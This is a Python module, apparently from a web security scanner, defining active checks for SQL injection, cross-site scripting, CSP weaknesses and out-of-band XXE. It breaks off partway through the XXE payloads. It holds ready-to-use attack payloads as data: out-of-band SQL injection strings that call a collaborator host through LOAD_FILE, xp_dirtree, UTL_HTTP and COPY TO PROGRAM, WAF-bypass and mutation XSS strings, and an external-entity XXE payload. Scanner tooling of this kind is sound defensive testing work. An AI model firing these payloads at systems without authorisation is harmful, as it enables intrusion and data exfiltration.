"""ProxyEngine Pro Scanner Checks — 50 advanced active security checks.

Each check is an async function: async def check_name(client, url) -> list[ScanFinding]
All checks registered in CUSTOM_CHECKS_PRO dict at the bottom.
"""

from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import re
import string
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, quote, urljoin

import httpx

from models import ScanFinding

log = logging.getLogger("proxy-engine.scanner_pro")

COLLAB_DOMAIN = "collab.internal"


# ─── Helpers ────────────────────────────────────────────────────────────────

def _finding(
    template_id: str,
    name: str,
    severity: str,
    url: str,
    description: str,
    confidence: str = "tentative",
    matched_at: str = "",
    extracted: list[str] | None = None,
    curl_command: str = "",
    remediation: str = "",
) -> ScanFinding:
    return ScanFinding(
        template_id=template_id,
        name=name,
        severity=severity,
        url=url,
        matched_at=matched_at or url,
        description=description,
        confidence=confidence,
        source="custom",
        extracted=extracted or [],
        curl_command=curl_command,
        remediation=remediation,
    )


def _inject_params(url: str, payload: str) -> list[str]:
    """Return list of URLs with payload injected into each query param."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        sep = "&" if "?" in url else "?"
        return [f"{url}{sep}test={quote(payload)}"]
    urls = []
    for key in params:
        new_params = {k: v[0] for k, v in params.items()}
        new_params[key] = payload
        new_query = urlencode(new_params)
        urls.append(urlunparse(parsed._replace(query=new_query)))
    return urls


async def _safe_get(client: httpx.AsyncClient, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.get(url, timeout=10.0, follow_redirects=False, **kw)
    except Exception:
        return None


async def _safe_post(client: httpx.AsyncClient, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.post(url, timeout=10.0, follow_redirects=False, **kw)
    except Exception:
        return None


async def _safe_request(client: httpx.AsyncClient, method: str, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.request(method, url, timeout=10.0, follow_redirects=False, **kw)
    except Exception:
        return None


# ═════════════════════════════════════════════════════════════════════════════
# 1. boolean_blind_sqli
# ═════════════════════════════════════════════════════════════════════════════

async def boolean_blind_sqli(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect boolean-based blind SQL injection via response differential."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    true_payloads = ["' AND 1=1--", "' AND 'a'='a'--", "\" AND 1=1--", "' OR 1=1--"]
    false_payloads = ["' AND 1=2--", "' AND 'a'='b'--", "\" AND 1=2--", "' OR 1=2--"]

    try:
        baseline = await _safe_get(client, url)
        if not baseline:
            return findings
        baseline_len = len(baseline.text)
        baseline_status = baseline.status_code

        for key in params:
            original_val = params[key][0]
            for tp, fp in zip(true_payloads, false_payloads):
                new_params_true = {k: v[0] for k, v in params.items()}
                new_params_true[key] = original_val + tp
                url_true = urlunparse(parsed._replace(query=urlencode(new_params_true)))

                new_params_false = {k: v[0] for k, v in params.items()}
                new_params_false[key] = original_val + fp
                url_false = urlunparse(parsed._replace(query=urlencode(new_params_false)))

                resp_true = await _safe_get(client, url_true)
                resp_false = await _safe_get(client, url_false)

                if not resp_true or not resp_false:
                    continue

                true_len = len(resp_true.text)
                false_len = len(resp_false.text)

                # True condition should match baseline, false should differ
                true_matches_baseline = (
                    resp_true.status_code == baseline_status
                    and abs(true_len - baseline_len) < max(50, baseline_len * 0.05)
                )
                false_differs = (
                    resp_false.status_code != baseline_status
                    or abs(false_len - baseline_len) > max(50, baseline_len * 0.1)
                )

                if true_matches_baseline and false_differs:
                    findings.append(_finding(
                        template_id="pro-boolean-blind-sqli",
                        name="Boolean-Based Blind SQL Injection",
                        severity="critical",
                        url=url,
                        description=(
                            f"Parameter '{key}' appears vulnerable to boolean-based blind SQLi. "
                            f"True condition (1=1) response length={true_len} matches baseline={baseline_len}, "
                            f"False condition (1=2) response length={false_len} differs significantly. "
                            f"Payload: {tp}"
                        ),
                        confidence="firm",
                        matched_at=url_true,
                        remediation="Use parameterized queries / prepared statements.",
                    ))
                    break  # one finding per param
    except Exception as e:
        log.debug("boolean_blind_sqli error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 2. union_sqli
# ═════════════════════════════════════════════════════════════════════════════

async def union_sqli(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect UNION-based SQL injection by probing column count then injecting UNION SELECT."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    try:
        for key in params:
            original_val = params[key][0]
            col_count = 0

            # Phase 1: determine column count with ORDER BY
            for n in range(1, 21):
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = f"{original_val}' ORDER BY {n}--"
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if not resp:
                    break
                if resp.status_code >= 500 or "order" in resp.text.lower() and "unknown column" in resp.text.lower():
                    col_count = n - 1
                    break
                # Also check for common error strings
                error_indicators = ["unknown column", "order clause", "ORDER BY", "number of columns"]
                if any(ind.lower() in resp.text.lower() for ind in error_indicators):
                    col_count = n - 1
                    break

            if col_count < 1:
                continue

            # Phase 2: attempt UNION SELECT with determined column count
            nulls = ",".join(["NULL"] * col_count)
            marker = "pxe_union_7x7"
            # Try replacing one NULL with our marker
            for pos in range(col_count):
                cols = ["NULL"] * col_count
                cols[pos] = f"'{marker}'"
                union_payload = f"' UNION SELECT {','.join(cols)}--"
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = f"{original_val}{union_payload}"
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if resp and marker in resp.text:
                    findings.append(_finding(
                        template_id="pro-union-sqli",
                        name="UNION-Based SQL Injection",
                        severity="critical",
                        url=url,
                        description=(
                            f"Parameter '{key}' vulnerable to UNION SQLi. "
                            f"Columns: {col_count}, marker reflected at position {pos}. "
                            f"Payload: {union_payload}"
                        ),
                        confidence="confirmed",
                        matched_at=test_url,
                        extracted=[marker],
                        remediation="Use parameterized queries / prepared statements.",
                    ))
                    break
    except Exception as e:
        log.debug("union_sqli error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 3. oob_sqli
# ═════════════════════════════════════════════════════════════════════════════

async def oob_sqli(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Out-of-band SQL injection via DNS exfiltration payloads (MySQL, MSSQL, Oracle, PostgreSQL)."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    if not params:
        return findings

    uid = hashlib.md5(url.encode()).hexdigest()[:8]
    oob_payloads = {
        "mysql_load_file": f"' UNION SELECT LOAD_FILE('\\\\\\\\{uid}.mysql.{COLLAB_DOMAIN}\\\\a')--",
        "mysql_into_outfile": f"' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{uid}.mysql2.{COLLAB_DOMAIN}\\\\a'--",
        "mssql_xp_dirtree": f"'; EXEC master..xp_dirtree '\\\\{uid}.mssql.{COLLAB_DOMAIN}\\a'--",
        "mssql_openrowset": f"'; SELECT * FROM OPENROWSET('SQLOLEDB','server={uid}.mssql2.{COLLAB_DOMAIN}';'sa';'','')--",
        "oracle_utl_http": f"' UNION SELECT UTL_HTTP.REQUEST('http://{uid}.oracle.{COLLAB_DOMAIN}/') FROM DUAL--",
        "oracle_httpuritype": f"' UNION SELECT HTTPURITYPE('http://{uid}.ora2.{COLLAB_DOMAIN}/').GETCLOB() FROM DUAL--",
        "postgres_copy": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {uid}.pg.{COLLAB_DOMAIN}'--",
    }

    try:
        for key in params:
            original_val = params[key][0]
            for payload_name, payload in oob_payloads.items():
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = original_val + payload
                test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                resp = await _safe_get(client, test_url)
                if resp and resp.status_code not in (400, 403, 404, 405):
                    findings.append(_finding(
                        template_id=f"pro-oob-sqli-{payload_name}",
                        name=f"OOB SQL Injection ({payload_name})",
                        severity="high",
                        url=url,
                        description=(
                            f"OOB SQLi payload sent to parameter '{key}'. "
                            f"Check collaborator ({COLLAB_DOMAIN}) for DNS interaction from {uid}.*.{COLLAB_DOMAIN}. "
                            f"Payload type: {payload_name}"
                        ),
                        confidence="tentative",
                        matched_at=test_url,
                        remediation="Use parameterized queries. Disable dangerous functions (LOAD_FILE, xp_dirtree, UTL_HTTP).",
                    ))
                    break  # one OOB finding per param is enough
    except Exception as e:
        log.debug("oob_sqli error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 4. second_order_sqli
# ═════════════════════════════════════════════════════════════════════════════

async def second_order_sqli(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Inject SQLi canary at registration/input endpoints, detect in subsequent responses."""
    findings: list[ScanFinding] = []
    parsed = urlparse(url)
    canary = "pxe2nd'\"<sqli>"
    canary_b64 = base64.b64encode(canary.encode()).decode()

    injection_payloads = [
        {"username": canary, "email": f"test_{canary_b64[:6]}@test.com", "password": "Test1234!"},
        {"name": canary, "value": canary},
        {"q": canary, "search": canary},
        {"comment": canary, "body": canary, "message": canary},
        {"title": canary, "content": canary},
    ]

    try:
        # Phase 1: inject canary via POST
        for payload in injection_payloads:
            resp = await _safe_post(client, url, data=payload)
            if not resp:
                resp = await _safe_post(client, url, json=payload)
            if resp and resp.status_code in range(200, 400):
                break

        # Phase 2: check if canary appears in subsequent GET
        check_urls = [url]
        # Also check common profile/listing endpoints
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in ["/profile", "/account", "/users", "/comments", "/api/users", parsed.path]:
            check_urls.append(urljoin(base, path))

        for check_url in check_urls:
            resp = await _safe_get(client, check_url)
            if resp and canary in resp.text:
                # Check if SQL metacharacters survived unescaped
                if "'" in resp.text[resp.text.index(canary):resp.text.index(canary) + len(canary) + 5]:
                    findings.append(_finding(
                        template_id="pro-second-order-sqli",
                        name="Potential Second-Order SQL Injection",
                        severity="high",
                        url=url,
                        description=(
                            f"Injected canary '{canary}' stored and reflected unescaped at {check_url}. "
                            "SQL metacharacters (single/double quotes) preserved — indicates potential "
                            "second-order SQLi when data is used in subsequent queries."
                        ),
                        confidence="tentative",
                        matched_at=check_url,
                        remediation="Use parameterized queries for all database operations, including those using stored data.",
                    ))
                    break
    except Exception as e:
        log.debug("second_order_sqli error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 5. error_sqli_fingerprint
# ═════════════════════════════════════════════════════════════════════════════

async def error_sqli_fingerprint(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Detect error-based SQLi via 30+ DBMS-specific error patterns."""
    findings: list[ScanFinding] = []

    DBMS_ERRORS: dict[str, list[str]] = {
        "MySQL": [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"Unknown column '[^']+' in",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"MySqlException",
        ],
        "PostgreSQL": [
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"PostgreSQL query failed",
        ],
        "Microsoft SQL Server": [
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"OLE DB.*? SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver",
            r"Warning.*?\W(mssql|sqlsrv)_",
            r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
            r"System\.Data\.SqlClient\.",
            r"(?s)Exception.*?\bRoadhouse\.Cms\.",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"com\.jnetdirect\.jsql",
            r"macabordar.*?teleabordar",
            r"Unclosed quotation mark after the character string",
        ],
        "Oracle": [
            r"\bORA-\d{5}",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\W(oci|ora)_",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
            r"oracle\.jdbc",
        ],
        "SQLite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
            r"Warning.*?\W(sqlite_|SQLite3::)",
            r"\[SQLITE_ERROR\]",
            r"SQLite error \d+:",
            r"sqlite3\.OperationalError:",
            r"SQLite3::SQLException",
            r"org\.sqlite\.JDBC",
            r"SQLiteException",
        ],
    }

    error_payloads = ["'", "\"", "'--", "' OR '", "1' OR '1'='1", "\" OR \"1\"=\"1", "';", "\\'", "1;SELECT", "' UNION SELECT NULL--"]

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    try:
        # Get baseline to avoid false positives
        baseline = await _safe_get(client, url)
        baseline_text = baseline.text if baseline else ""

        test_urls = []
        if params:
            for key in params:
                for payload in error_payloads:
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[key] = params[key][0] + payload
                    test_urls.append((
                        key,
                        payload,
                        urlunparse(parsed._replace(query=urlencode(new_params))),
                    ))
        else:
            for payload in error_payloads[:3]:
                test_urls.append(("path", payload, url + quote(payload)))

        found_dbms = set()
        for param_name, payload, test_url in test_urls:
            resp = await _safe_get(client, test_url)
            if not resp:
                continue

            for dbms, patterns in DBMS_ERRORS.items():
                if dbms in found_dbms:
                    continue
                for pattern in patterns:
                    # Only flag if pattern is NOT in baseline
                    if re.search(pattern, resp.text, re.IGNORECASE) and not re.search(pattern, baseline_text, re.IGNORECASE):
                        match = re.search(pattern, resp.text, re.IGNORECASE)
                        found_dbms.add(dbms)
                        findings.append(_finding(
                            template_id=f"pro-error-sqli-{dbms.lower().replace(' ', '-')}",
                            name=f"Error-Based SQL Injection ({dbms})",
                            severity="high",
                            url=url,
                            description=(
                                f"DBMS error from {dbms} detected in response when injecting "
                                f"into parameter '{param_name}'. Error pattern: {match.group(0)[:100]}. "
                                f"Payload: {payload}"
                            ),
                            confidence="firm",
                            matched_at=test_url,
                            extracted=[match.group(0)[:200]],
                            remediation="Use parameterized queries. Disable verbose error messages in production.",
                        ))
                        break
    except Exception as e:
        log.debug("error_sqli_fingerprint error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 6. stored_xss_comprehensive
# ═════════════════════════════════════════════════════════════════════════════

async def stored_xss_comprehensive(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Inject unique canary at every insertion point, check subsequent responses."""
    findings: list[ScanFinding] = []
    canary = "<pxe7k>"
    canary_alt = "pxe7kattr"
    parsed = urlparse(url)

    injection_fields = [
        {"name": canary, "email": "xss@test.com", "comment": canary, "body": canary},
        {"title": canary, "description": canary, "content": canary},
        {"q": canary, "search": canary, "message": canary},
        {"username": canary_alt, "bio": canary, "website": f"javascript:{canary_alt}"},
        {"first_name": canary, "last_name": canary, "address": canary},
    ]

    try:
        # Phase 1: inject canary via POST (both form and JSON)
        injected = False
        for fields in injection_fields:
            resp = await _safe_post(client, url, data=fields)
            if resp and resp.status_code in range(200, 400):
                injected = True
            resp_json = await _safe_post(client, url, json=fields)
            if resp_json and resp_json.status_code in range(200, 400):
                injected = True

        # Phase 2: check GET for reflected canary
        base = f"{parsed.scheme}://{parsed.netloc}"
        check_paths = [parsed.path, "/", "/comments", "/posts", "/users", "/profile", "/search", "/api/comments"]
        for path in check_paths:
            check_url = urljoin(base, path)
            resp = await _safe_get(client, check_url)
            if resp and canary in resp.text:
                # Verify the tag is unescaped (not &lt;pxe7k&gt;)
                if "<pxe7k>" in resp.text and "&lt;pxe7k&gt;" not in resp.text:
                    findings.append(_finding(
                        template_id="pro-stored-xss",
                        name="Stored Cross-Site Scripting (XSS)",
                        severity="high",
                        url=url,
                        description=(
                            f"HTML canary tag {canary} was stored and rendered unescaped at {check_url}. "
                            "Arbitrary HTML/JavaScript can be injected and will execute in other users' browsers."
                        ),
                        confidence="confirmed",
                        matched_at=check_url,
                        extracted=[canary],
                        remediation="HTML-encode all user input before rendering. Use Content-Security-Policy.",
                    ))
                    break

        # Also test via GET params (reflected)
        for test_url in _inject_params(url, canary):
            resp = await _safe_get(client, test_url)
            if resp and "<pxe7k>" in resp.text and "&lt;pxe7k&gt;" not in resp.text:
                findings.append(_finding(
                    template_id="pro-reflected-xss-html",
                    name="Reflected XSS (HTML Context)",
                    severity="high",
                    url=url,
                    description=f"HTML canary {canary} reflected unescaped in response.",
                    confidence="confirmed",
                    matched_at=test_url,
                    remediation="HTML-encode output. Implement CSP.",
                ))
                break
    except Exception as e:
        log.debug("stored_xss_comprehensive error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 7. dom_xss_advanced
# ═════════════════════════════════════════════════════════════════════════════

async def dom_xss_advanced(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Check for DOM XSS sinks in page source: postMessage, eval, innerHTML, document.write."""
    findings: list[ScanFinding] = []

    DOM_SINKS = [
        (r'\.innerHTML\s*=', "innerHTML assignment"),
        (r'\.outerHTML\s*=', "outerHTML assignment"),
        (r'document\.write\s*\(', "document.write()"),
        (r'document\.writeln\s*\(', "document.writeln()"),
        (r'eval\s*\(', "eval()"),
        (r'setTimeout\s*\(\s*["\']', "setTimeout with string"),
        (r'setInterval\s*\(\s*["\']', "setInterval with string"),
        (r'new\s+Function\s*\(', "new Function()"),
        (r'\.insertAdjacentHTML\s*\(', "insertAdjacentHTML()"),
        (r'jQuery\s*\(\s*["\']<', "jQuery HTML injection"),
        (r'\$\s*\(\s*["\']<', "jQuery $ HTML injection"),
        (r'\.html\s*\(', "jQuery .html()"),
        (r'\.append\s*\(\s*["\']<', "jQuery .append() with HTML"),
    ]

    DOM_SOURCES = [
        (r'location\.(hash|search|href|pathname)', "location source"),
        (r'document\.(URL|documentURI|referrer|cookie)', "document source"),
        (r'window\.(name|location)', "window source"),
        (r'addEventListener\s*\(\s*["\']message', "postMessage listener"),
        (r'\.postMessage\s*\(', "postMessage sender"),
    ]

    try:
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        body = resp.text
        found_sinks = []
        found_sources = []

        for pattern, desc in DOM_SINKS:
            matches = re.findall(pattern, body)
            if matches:
                found_sinks.append(desc)

        for pattern, desc in DOM_SOURCES:
            matches = re.findall(pattern, body)
            if matches:
                found_sources.append(desc)

        # If both sinks and sources exist, likely DOM XSS
        if found_sinks and found_sources:
            findings.append(_finding(
                template_id="pro-dom-xss-advanced",
                name="Potential DOM-Based XSS",
                severity="medium",
                url=url,
                description=(
                    f"Page contains DOM XSS sources ({', '.join(found_sources[:5])}) "
                    f"and sinks ({', '.join(found_sinks[:5])}). "
                    "Manual verification required to confirm data flow from source to sink."
                ),
                confidence="tentative",
                extracted=found_sinks[:3] + found_sources[:3],
                remediation="Sanitize DOM inputs. Use textContent instead of innerHTML. Validate postMessage origins.",
            ))

        # Check for postMessage without origin validation
        if "addEventListener" in body and "message" in body:
            # Look for handlers that don't check event.origin
            msg_handlers = re.findall(
                r'addEventListener\s*\(\s*["\']message["\'].*?\n([\s\S]{0,500})',
                body,
            )
            for handler in msg_handlers:
                if "origin" not in handler.lower():
                    findings.append(_finding(
                        template_id="pro-dom-xss-postmessage",
                        name="postMessage Handler Without Origin Check",
                        severity="medium",
                        url=url,
                        description=(
                            "postMessage event listener found without origin validation. "
                            "An attacker can send arbitrary messages from a malicious page."
                        ),
                        confidence="tentative",
                        remediation="Always validate event.origin in postMessage handlers.",
                    ))
                    break
    except Exception as e:
        log.debug("dom_xss_advanced error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 8. mutation_xss
# ═════════════════════════════════════════════════════════════════════════════

async def mutation_xss(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """mXSS payloads exploiting browser parsing quirks (noscript, style, svg/math namespace)."""
    findings: list[ScanFinding] = []

    MXSS_PAYLOADS = [
        ('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', "noscript mXSS"),
        ('<math><mtext><table><mglyph><style><!--</style><img title="-->&lt;img src=x onerror=alert(1)&gt;">', "math/style mXSS"),
        ('<svg><style><img src="</style><img src=x onerror=alert(1)//">', "svg/style mXSS"),
        ('<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img src=x onerror=alert(1)>">', "form/math mXSS"),
        ('<math><mtext><img src="</mtext><img src=x onerror=alert(1)//">', "math/mtext mXSS"),
        ('<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', "svg/p/style mXSS"),
        ('<svg><desc><noscript><img src="</noscript><img src=x onerror=alert(1)//">', "svg/desc mXSS"),
        ('<math><mi><table><mglyph><nobr><style></style><img src=x onerror=alert(1)>', "math/nobr mXSS"),
    ]

    try:
        for test_url in _inject_params(url, MXSS_PAYLOADS[0][0]):
            resp = await _safe_get(client, test_url)
            if not resp:
                continue

            for payload, name in MXSS_PAYLOADS:
                for injected_url in _inject_params(url, payload):
                    resp = await _safe_get(client, injected_url)
                    if not resp:
                        continue
                    # Check if payload or key parts survived sanitization
                    if "onerror" in resp.text and ("<img" in resp.text or "<svg" in resp.text):
                        if payload[:20] in resp.text or "onerror=alert" in resp.text:
                            findings.append(_finding(
                                template_id="pro-mutation-xss",
                                name=f"Mutation XSS ({name})",
                                severity="high",
                                url=url,
                                description=(
                                    f"mXSS payload partially or fully reflected: {name}. "
                                    "Browser DOM re-parsing may execute JavaScript after sanitization."
                                ),
                                confidence="tentative",
                                matched_at=injected_url,
                                remediation="Use DOMPurify with SAFE_FOR_TEMPLATES. Avoid server-side HTML sanitizers that don't account for mXSS.",
                            ))
                            return findings  # One mXSS finding is enough
    except Exception as e:
        log.debug("mutation_xss error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 9. xss_filter_bypass
# ═════════════════════════════════════════════════════════════════════════════

async def xss_filter_bypass(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """30 WAF-specific XSS bypass payloads targeting CloudFlare, Akamai, AWS WAF, etc."""
    findings: list[ScanFinding] = []

    BYPASS_PAYLOADS = [
        # CloudFlare bypasses
        ('<Img Src=x oNerRor=alert`1`>', "CloudFlare case-mix"),
        ('<svg/onload=alert(String.fromCharCode(88,83,83))>', "CloudFlare fromCharCode"),
        ('<details open ontoggle=alert(1)>', "details/ontoggle"),
        ('<video><source onerror="alert(1)">', "video/source onerror"),
        ('<svg><animate onbegin=alert(1) attributeName=x dur=1s>', "SVG animate"),
        # Akamai bypasses
        ('<input onfocus=alert(1) autofocus>', "input autofocus"),
        ('<marquee onstart=alert(1)>', "marquee onstart"),
        ('<body onpageshow=alert(1)>', "body onpageshow"),
        ('<isindex type=image src=1 onerror=alert(1)>', "isindex onerror"),
        # AWS WAF bypasses
        ('"><svg/onload=confirm(1)//', "SVG onload break"),
        ('<img src=x onerror=confirm`1`>', "template literal"),
        ('<svg onload=alert&lpar;1&rpar;>', "HTML entity bypass"),
        # Generic encoding bypasses
        ('%3Csvg%20onload%3Dalert(1)%3E', "URL-encoded SVG"),
        ('<svg%0Aonload%0A=%0Aalert(1)>', "null-byte whitespace"),
        ('<a href="jav&#x09;ascript:alert(1)">click</a>', "JS protocol tab"),
        ('<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">x</a>', "HTML entity protocol"),
        # Event handler variants
        ('<body onload=alert(1)>', "body onload"),
        ('<img src=1 onerror=alert(1)>', "classic img onerror"),
        ('<object data="javascript:alert(1)">', "object data JS"),
        ('<embed src="javascript:alert(1)">', "embed src JS"),
        # Double encoding
        ('%253Cscript%253Ealert(1)%253C/script%253E', "double URL encoding"),
        # Unicode bypasses
        ('<scrip\u0074>alert(1)</scrip\u0074>', "unicode escape"),
        ('<img src=x onerror=\u0061lert(1)>', "unicode in handler"),
        # Polyglot
        ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//", "polyglot"),
        ('<svg/onload="+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//>', "SVG polyglot"),
        # Framework specific
        ('{{constructor.constructor("alert(1)")()}}', "Angular sandbox escape"),
        ('${alert(1)}', "template literal injection"),
        ('<x contenteditable onblur=alert(1)>lose focus</x>', "contenteditable"),
        ('<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>', "CSS animation"),
        ('<iframe srcdoc="<script>alert(1)</script>">', "iframe srcdoc"),
    ]

    try:
        for payload, bypass_name in BYPASS_PAYLOADS:
            for test_url in _inject_params(url, payload):
                resp = await _safe_get(client, test_url)
                if not resp:
                    continue
                # Check if key attack components survived
                attack_indicators = ["onerror=", "onload=", "onclick=", "onfocus=", "ontoggle=",
                                     "onbegin=", "onstart=", "onpageshow=", "alert(", "confirm(",
                                     "javascript:", "onanimationend=", "onblur=", "onmouseover="]
                for indicator in attack_indicators:
                    if indicator in payload.lower() and indicator in resp.text.lower():
                        findings.append(_finding(
                            template_id="pro-xss-waf-bypass",
                            name=f"XSS WAF Bypass ({bypass_name})",
                            severity="high",
                            url=url,
                            description=(
                                f"XSS bypass payload reflected with active content intact. "
                                f"Bypass technique: {bypass_name}. Indicator: {indicator}"
                            ),
                            confidence="firm",
                            matched_at=test_url,
                            extracted=[payload[:100]],
                            remediation="Use context-aware output encoding. Don't rely solely on WAF for XSS protection.",
                        ))
                        return findings  # One confirmed bypass is enough
    except Exception as e:
        log.debug("xss_filter_bypass error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 10. csp_bypass_xss
# ═════════════════════════════════════════════════════════════════════════════

async def csp_bypass_xss(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Check for CSP weaknesses: JSONP endpoints, Angular CDNs, missing base-uri."""
    findings: list[ScanFinding] = []

    UNSAFE_CSP_PATTERNS = [
        ("'unsafe-inline'", "unsafe-inline allows inline scripts"),
        ("'unsafe-eval'", "unsafe-eval allows eval()"),
        ("data:", "data: URI allows inline content injection"),
        ("*.googleapis.com", "googleapis.com hosts JSONP endpoints usable for CSP bypass"),
        ("*.gstatic.com", "gstatic.com may host exploitable resources"),
        ("*.cloudflare.com", "cloudflare.com CDN may host bypass gadgets"),
        ("cdn.jsdelivr.net", "jsdelivr hosts Angular/libraries usable for CSP bypass"),
        ("cdnjs.cloudflare.com", "cdnjs hosts Angular/libraries usable for CSP bypass"),
        ("unpkg.com", "unpkg hosts npm packages usable for CSP bypass"),
        ("*.google.com", "google.com has JSONP endpoints for CSP bypass"),
        ("ajax.googleapis.com", "ajax.googleapis.com hosts Angular (CSP bypass via ng-app)"),
        ("accounts.google.com", "accounts.google.com has JSONP/redirect (CSP bypass)"),
    ]

    try:
        resp = await _safe_get(client, url)
        if not resp:
            return findings

        csp_header = resp.headers.get("content-security-policy", "")
        csp_ro = resp.headers.get("content-security-policy-report-only", "")
        csp = csp_header or csp_ro

        if not csp:
            findings.append(_finding(
                template_id="pro-csp-missing",
                name="Missing Content-Security-Policy Header",
                severity="medium",
                url=url,
                description="No CSP header present. XSS attacks are not mitigated by CSP.",
                confidence="confirmed",
                remediation="Implement a strict Content-Security-Policy header.",
            ))
            return findings

        # Check for unsafe directives
        for pattern, desc in UNSAFE_CSP_PATTERNS:
            if pattern.lower() in csp.lower():
                findings.append(_finding(
                    template_id="pro-csp-weak-" + pattern.strip("'*.").replace(".", "-")[:20],
                    name=f"Weak CSP: {pattern}",
                    severity="medium",
                    url=url,
                    description=f"CSP contains '{pattern}': {desc}. Full CSP: {csp[:200]}",
                    confidence="confirmed",
                    extracted=[pattern],
                    remediation="Remove unsafe CSP directives. Use nonces or hashes instead of unsafe-inline.",
                ))

        # Check for missing base-uri
        if "base-uri" not in csp.lower():
            findings.append(_finding(
                template_id="pro-csp-no-base-uri",
                name="CSP Missing base-uri Directive",
                severity="low",
                url=url,
                description="CSP does not restrict base-uri. Attackers can inject <base> tags to hijack relative URLs.",
                confidence="confirmed",
                remediation="Add base-uri 'self' to CSP.",
            ))

        # Check for wildcard in script-src
        script_src_match = re.search(r"script-src\s+([^;]+)", csp, re.IGNORECASE)
        if script_src_match and "*" in script_src_match.group(1):
            findings.append(_finding(
                template_id="pro-csp-wildcard-script",
                name="CSP script-src Contains Wildcard",
                severity="high",
                url=url,
                description=f"script-src contains wildcard: {script_src_match.group(1)[:100]}",
                confidence="confirmed",
                remediation="Replace wildcard with specific trusted domains in script-src.",
            ))

        # Only report-only mode
        if csp_ro and not csp_header:
            findings.append(_finding(
                template_id="pro-csp-report-only",
                name="CSP in Report-Only Mode",
                severity="low",
                url=url,
                description="CSP is set in report-only mode and does not enforce restrictions.",
                confidence="confirmed",
                remediation="Switch from Content-Security-Policy-Report-Only to Content-Security-Policy.",
            ))
    except Exception as e:
        log.debug("csp_bypass_xss error: %s", e)
    return findings


# ═════════════════════════════════════════════════════════════════════════════
# 11. oob_xxe
# ═════════════════════════════════════════════════════════════════════════════

async def oob_xxe(client: httpx.AsyncClient, url: str) -> list[ScanFinding]:
    """Out-of-band XXE via external DTD referencing collaborator domain."""
    findings: list[ScanFinding] = []
    uid = hashlib.md5(url.encode()).hexdigest()[:8]

    xxe_payloads = [
        # Standard external entity
        (
            f'<?xml version="1.0"?><!DOCTYPE foo ['
            f'<!ENTITY xxe SYSTEM "http://{uid}.xxe.{COLLAB_DOMAIN}/test">'
            f']><foo>&xxe;</foo>',
            "standard external entity"
        ),
        # Parameter entity OOB
        (
            f'<?xml version="1.0"?><!DOCTYPE foo ['
